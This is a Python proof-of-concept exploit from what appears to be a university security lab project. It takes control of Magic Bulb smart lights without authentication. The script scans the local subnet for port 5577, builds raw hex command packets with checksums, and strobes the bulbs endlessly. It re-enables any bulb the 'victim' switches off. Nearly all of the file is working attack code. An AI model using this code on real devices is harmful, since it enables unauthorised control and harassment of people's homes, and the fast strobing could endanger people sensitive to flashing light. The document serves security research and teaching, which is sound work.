# ECE419/CS460 Security Lab Project
# Bill Xun, Jonathan Hsun

# This is proof-of-concept code to exploit the Magic Bulb (v6/v8) to
# send arbitrary commands to the bulb without authentication or actions
# through the given app. This code can only be used locally, and can be 
# used on one or more bulbs, or the code can automatically detect bulbs
# on the network, as long as you are conncted to it. 

# Refer to the remote version of the code to manipulate the bulb outside
# the network (from anywhere in the world).

# Refer to the report for more details

# This code is here for general information purposes only and should not
# be used on anyone's bulbs without permission.

import socket
import sys
from time import sleep
import random

# the host to connect to
HOST = ''
# the port to connect to
PORT = 5577
# boolean value to signal light to turn on/off for maximum strobe effect
spaz = False
# if rainbow mode is on
rainbow = False
# speed of strobing (in seconds)
speed = 0.05

# r,g,b, values
R = 0
G = 0
B = 0

# user choice 
command = 0

#list of bulbs, if more than one
bulb_ips = []

# parse user selections
nargs = len(sys.argv)
if nargs > 1:
	if sys.argv[1] == '-h' or sys.argv[1] == '--help':
		print "python magicctl_local.py [COMMAND] [local IP] [R] [G] [B]"
		print "Commands: \n1 - white strobe fast, 2 - white strobe slow\n3 - rainbow strobe fast, 4 - rainbow strobe slow\n5 - set color"
		exit(1)

	command = int(sys.argv[1])

	# settings
	if command == 1:
		speed = 0.005
	if command == 2:
		speed = 0.05
	if command == 3:
		rainbow = True
		speed = 0.005
	if command == 4:
		rainbow = True
		speed = 0.05

	# if host is specified
	if nargs > 2:
		HOST = sys.argv[2]
		bulb_ips.append(HOST)
	else:
		HOST = ''

	# if you just want to change the color
	if command == 5:
		R = int(sys.argv[3])
		G = int(sys.argv[4])
		B = int(sys.argv[5])
		sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sk.connect((HOST, PORT))

		data = '31'.decode("hex") + hex(R)[2:].zfill(2).decode("hex") + hex(G)[2:].zfill(2).decode("hex") + hex(B)[2:].zfill(2).decode("hex") +'00f00f'.decode("hex")
		stuff = bytearray(data)
		data += hex(sum(stuff)%256)[2:].zfill(2).decode("hex")

		sk.send(data)
		exit(1)

# if no host specified, get local ip (192.168.* or 10.0.* or 10.1.*)
if HOST == '':	
	# get local ip
	thisip = socket.gethostbyname(socket.gethostname())
	subnet = thisip.rfind('.')
	if subnet == -1:
		print "unable to get local ip"
		exit(1)
	# get subnet ip (the stuff before the last .)
	thisip[:subnet+1]

	# ping and find devices on the network that have port 5577 open
	for i in range(1,255):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			s.connect((thisip[:subnet+1] + str(i), 5577))
		except socket.error:
			print "no bulb found on " + thisip[:subnet+1] + str(i)
			continue

		bulb_ips.append(thisip[:subnet+1]+str(i))
		# break

	print "bulbs found: " + str(bulb_ips)

# helper function to generate random colors. R,G,B values are specifically chosen so that they aren't always white for maximum color effect
# R,G,B values with similar numbers produce white shades
def getrainbow():
	R = random.randint(0, 255-random.randint(0,255))
	G = random.randint(0, 255-R)
	B = random.randint(0, 255-G)
	# create payload based on hexcodes used by the bulb (refer to report)
	data = '31'.decode("hex") + hex(R)[2:].zfill(2).decode("hex") + hex(G)[2:].zfill(2).decode("hex") + hex(B)[2:].zfill(2).decode("hex") +'00f00f'.decode("hex")
	return data

# do this FOREVER
while(1):
	# light up each bulb
	for ip in bulb_ips:
		HOST = ip
		#strobe it
		for i in range(2):
			# change the bulbs color
			if spaz:
				if not rainbow:
					data = '31ffffff00f00f'.decode('hex')
				else:
					data = getrainbow()
			# turn the bulb off
			else:
				data = '3100000000f00f'.decode('hex')

			#alternate this
			spaz = spaz ^ True

			#open up a tcp connection
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((HOST, PORT))

			# generate the checksum (refer to report)
			stuff = bytearray(data)
			data += hex(sum(stuff)%256)[2:].zfill(2).decode("hex")

			#send the data
			s.send(data)
			data = s.recv(1024)
			s.close()

			#speed
			sleep(speed)

			# TURN THE BULB ON, in case the victim decides to turn it off
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((HOST, PORT))
			s.send("71230fa3".decode('hex'))
			s.close()

